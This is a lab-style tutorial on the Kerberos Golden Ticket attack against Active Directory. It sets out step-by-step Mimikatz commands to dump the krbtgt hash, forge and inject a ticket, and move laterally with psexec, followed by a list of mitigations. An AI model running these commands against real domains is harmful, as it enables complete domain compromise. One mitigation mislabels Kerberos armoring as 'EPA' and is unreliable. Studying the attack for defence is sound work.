# Golden Ticket

## Overview

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that grants complete access to every machine and resource in the domain. Unlike pass-the-hash or pass-the-ticket attacks that rely on existing tickets, a Golden Ticket is artificially created by an attacker who has compromised the `krbtgt` account.

**Why is it powerful?**

- When you compromise the `krbtgt` account (the Kerberos TGT account), you own the domain.
- The `krbtgt` account's NTLM hash is the cryptographic key used to sign all TGTs in the domain.
- By forging a TGT signed with this key, the domain controller will blindly trust it, granting you access to any service or resource in the domain.
- Golden Tickets are persistent and difficult to detect, as they are cryptographically valid and bypass normal authentication checks.
- Unlike regular accounts that can be disabled or have passwords changed, revoking a Golden Ticket requires resetting the `krbtgt` password (twice, due to password history).

## Walkthrough

### 1. Obtain the krbtgt NTLM Hash and Domain SID

**Where is this step run?**

To dump the krbtgt hash, you must have access to the **Domain Controller itself**. This requires either:

- Direct access to a DC (via RDP, psexec, etc. with admin credentials)
- Access to a backup of NTDS.dit
- Running this step from a DC you've already compromised

Use Mimikatz (running on the DC with SYSTEM privileges) to dump the credentials of the `krbtgt` account and identify the domain SID:

```bash
mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

This command outputs:

```
Domain : MARVEL / S-1-5-21-1234567890-1234567890-1234567890
RID    : 502 (krbtgt)
User   : krbtgt
Hash   : aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

Record:

- **Domain SID**: S-1-5-21-1234567890-1234567890-1234567890 (without the trailing RID)
- **krbtgt NTLM Hash**: 5f4dcc3b5aa765d61d8327deb882cf99
- **Domain Name**: marvel.local

### 2. Create the Golden Ticket

**Where is this step run?**

Once you have the krbtgt NTLM hash and domain SID, you can create and use the Golden Ticket from **any compromised machine** with administrative/SYSTEM privileges. This can be a workstation, server, or any other domain-joined machine you control.

Using the domain SID and krbtgt hash, forge a Kerberos TGT with Mimikatz:

```bash
mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 /id:500 /ptt
```

**Parameters explained:**

- `/User:Administrator`: The username to impersonate in the ticket (purely cosmetic for logging—can be any name, even non-existent accounts).
- `/domain:marvel.local`: The domain name.
- `/sid:S-1-5-21-...`: The domain SID.
- `/krbtgt:...`: The NTLM hash of the krbtgt account.
- `/id:500`: **The critical parameter**, the RID (Relative Identifier) of the account to impersonate. RID 500 is always the built-in Administrator account, which carries Domain Admins group membership by default. The username in `/User:` is just cosmetic; the `/id:` parameter is what determines the actual permissions. Since the ticket is signed with the krbtgt hash, the Domain Controller trusts it completely and grants the group memberships (Domain Admins) associated with RID 500, allowing access to any resource in the domain.
- `/ptt`: "Pass the Ticket", inject the ticket directly into the current session.

### 3. Launch a New Command Prompt with the Injected Ticket

Once the ticket is injected, open a new command prompt where the ticket will be active:

```bash
mimikatz # misc::cmd
```

This launches a new `cmd.exe` process with the Golden Ticket loaded.

### 4. Access Resources Across the Domain

With the Golden Ticket injected, you can now access any resource or service in the domain:

```bash
# Access file shares on domain computers
> dir \\THEPUNISHER\c$
> dir \\IRONMAN\c$

# Execute commands remotely using psexec
> psexec.exe \\THEPUNISHER cmd.exe

# List network resources
> net view \\THEPUNISHER

# Access database servers, printers, and other services
```

The Golden Ticket grants you access to:

- File shares on all workstations and servers
- Remote administration tools (psexec, RDP, WinRM)
- SQL Server and other database services
- Printers, DHCP servers, and other network resources

## Alternative: Create Golden Ticket Without /ptt

If you want to generate the Golden Ticket without immediately injecting it (for later use on a different machine):

```bash
mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 /id:500 /ticket:golden.kirbi
```

This saves the ticket to `golden.kirbi`. You can then transfer this file and inject it on another machine using:

```bash
mimikatz # kerberos::ptt golden.kirbi
```

## Mitigations

- **Reset the krbtgt Password Twice**: If you detect a Golden Ticket has been created, reset the `krbtgt` password twice (the second reset invalidates previously cached hashes). Note: This is disruptive and may cause authentication issues until the change replicates.

  ```powershell
  Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewComplexPassword" -Force)
  ```

- **Monitor for krbtgt Access**: Alert on any attempts to dump or query the `krbtgt` account, which would indicate an attacker attempting this attack.

- **Implement Kerberos Armoring (EPA)**: Enable Enforce Explicit Kerberos Armoring (EPA) to add extra protection to TGTs, making forged tickets detectable.

- **Run Kerberos Constrained Delegation Audits**: Regularly audit which accounts have dangerous delegation rights that could be abused.

- **Restrict Domain Admin Accounts**: Limit the number of accounts with Domain Admin privileges, reducing the likelihood of compromise.

- **Use Privileged Access Workstations (PAW)**: Isolate high-privilege accounts on dedicated, hardened systems.

- **Monitor for Unusual TGT Requests**: Implement monitoring for TGTs with unusual properties (e.g., excessively long lifetimes, unusual RIDs, unexpected users).

- **Implement Conditional Access**: Use Azure AD Conditional Access or similar solutions to enforce MFA and restrict access based on risk factors.

- **Educate on Incident Response**: Ensure your security team knows that detecting a Golden Ticket requires active monitoring and cannot be fully mitigated without resetting krbtgt (which is disruptive).
